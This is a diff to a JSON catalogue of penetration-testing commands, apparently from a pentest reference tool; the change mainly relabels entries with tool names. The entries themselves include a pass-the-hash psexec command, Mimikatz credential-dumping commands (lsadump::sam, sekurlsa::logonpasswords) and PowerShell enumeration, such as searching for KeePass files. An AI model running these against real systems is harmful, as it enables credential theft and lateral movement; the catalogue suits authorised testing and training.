@@ -1,5 +1,5 @@
 {
-  "Version": "1.0.0.0",
+  "Version": "1.0.0.1",
   "Categories": [
     {
       "id": 0,
@@ -720,152 +720,152 @@
     {
       "Name": "Execute PsExec Hash",
       "Category": 9,
-      "Description": "Execute psexec on remote machine using NTLM hash",
+      "Description": "Execute psexec on remote machine using NTLM hash Mimikatz",
       "Command": "impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b administrator@192.168.213.212",
       "OS": "Linux"
     },
     {
-      "Name": "Elevate System Token",
+      "Name": "Elevate System Token Mimikatz",
       "Category": 16,
       "Description": "Elevate to SYSTEM user privileges",
       "Command": "token::elevate",
       "OS": "Windows"
     },
     {
-      "Name": "Enable Debug Privilege",
+      "Name": "Enable Debug Privilege Mimikatz",
       "Category": 16,
       "Description": "Enable SeDebugPrivilege access right",
       "Command": "privilege::debug",
       "OS": "Windows"
     },
     {
-      "Name": "Dump SAM Hashes",
+      "Name": "Dump SAM Hashes Mimikatz",
       "Category": 16,
       "Description": "Extract the NTLM hashes from the SAM",
       "Command": "lsadump::sam",
       "OS": "Windows"
     },
     {
-      "Name": "Extract Logon Passwords",
+      "Name": "Extract Logon Passwords Mimikatz",
       "Category": 16,
       "Description": "Attempts to extract plaintext passwords and password hashes from all available sources",
       "Command": "sekurlsa::logonpasswords",
       "OS": "Windows"
     },
     {
-      "Name": "List Local Users",
+      "Name": "List Local Users Powershell",
       "Category": 15,
-      "Description": "Get Local Users on Windows",
+      "Description": "Get Local Users on Windows Powershell",
       "Command": "Get-LocalUser",
       "OS": "Windows"
     },
     {
-      "Name": "Get Computer Information",
+      "Name": "Get Computer Information Powershell",
       "Category": 15,
       "Description": "Get Computer Info on Windows",
       "Command": "Get-ComputerInfo",
       "OS": "Windows"
     },
     {
-      "Name": "List Local Groups",
+      "Name": "List Local Groups Powershell",
       "Category": 15,
       "Description": "Get Group Info on Windows",
       "Command": "Get-LocalGroup",
       "OS": "Windows"
     },
     {
-      "Name": "List Group Members",
+      "Name": "List Group Members Powershell",
       "Category": 15,
       "Description": "Get Group Member Info on Windows",
       "Command": "Get-LocalGroupMember 'Group Name'",
       "OS": "Windows"
     },
     {
-      "Name": "List 32bit Applications",
+      "Name": "List 32bit Applications Powershell",
       "Category": 15,
       "Description": "List all installed 32bit applications",
       "Command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select displayname",
       "OS": "Windows"
     },
     {
-      "Name": "List 64bit Applications",
+      "Name": "List 64bit Applications Powershell",
       "Category": 15,
       "Description": "List all installed 64bit applications",
       "Command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select displayname",
       "OS": "Windows"
     },
     {
-      "Name": "List Process Paths",
+      "Name": "List Process Paths Powershell",
       "Category": 15,
       "Description": "List all running processes executable paths",
       "Command": "(Get-Process).Path",
       "OS": "Windows"
     },
     {
-      "Name": "List Running Processes",
+      "Name": "List Running Processes Powershell",
       "Category": 15,
       "Description": "List all running processes",
       "Command": "Get-Process",
       "OS": "Windows"
     },
     {
-      "Name": "Show PowerShell History",
+      "Name": "Show PowerShell History Powershell",
       "Category": 15,
       "Description": "Show powershell history for current user",
       "Command": "Get-History",
       "OS": "Windows"
     },
     {
-      "Name": "Get History Path",
+      "Name": "Get History Path Powershell",
       "Category": 15,
       "Description": "Show powershell history file path",
       "Command": "(Get-PSReadlineOption).HistorySavePath",
       "OS": "Windows"
     },
     {
-      "Name": "Search KDBX Files",
+      "Name": "Search KDBX Files Powershell",
       "Category": 15,
       "Description": "Recursive powershell search by wildcard for extension kdbx",
       "Command": "Get-ChildItem -Path c:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue",
       "OS": "Windows"
     },
     {
-      "Name": "Search Event Logs",
+      "Name": "Search Event Logs Powershell",
       "Category": 15,
       "Description": "Search windows events by event ID",
       "Command": "Get-WinEvent -FilterHashtable @{LogName = '*'; Id = 4104} | Select-Object -ExpandProperty Message",
       "OS": "Windows"
     },
     {
-      "Name": "Grep PowerShell Output",
+      "Name": "Grep PowerShell Output Powershell",
       "Category": 15,
       "Description": "Grep powershell command output",
       "Command": "Select-String -Pattern 'search term'",
       "OS": "Windows"
     },
     {
-      "Name": "Search Common Files",
+      "Name": "Search Common Files Powershell",
       "Category": 15,
       "Description": "Recursive powershell search by wildcard for common extensions",
       "Command": "Get-ChildItem -Path c:\\ -Include *.txt,*.pdf,*.xls,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue",
       "OS": "Windows"
     },
     {
-      "Name": "List All Services",
+      "Name": "List All Services Powershell",
       "Category": 15,
       "Description": "Search for all services, running and stopped, that don't have system32 in the path",
       "Command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.PathName -notlike \"*system32*\"}",
       "OS": "Windows"
     },
     {
-      "Name": "List Running Services",
+      "Name": "List Running Services Powershell",
       "Category": 15,
       "Description": "Search for running services that don't have system32 in the path",
       "Command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | Where-Object {$_.PathName -notlike \"*system32*\"}",
       "OS": "Windows"
     },
     {
-      "Name": "Test Port Connectivity",
+      "Name": "Test Port Connectivity Powershell",
       "Category": 7,
       "Description": "Tests connectivity to port 25 (SMTP) on 192.168.50.8 using PowerShell",
       "Command": "Test-NetConnection -Port 25 192.168.50.8",
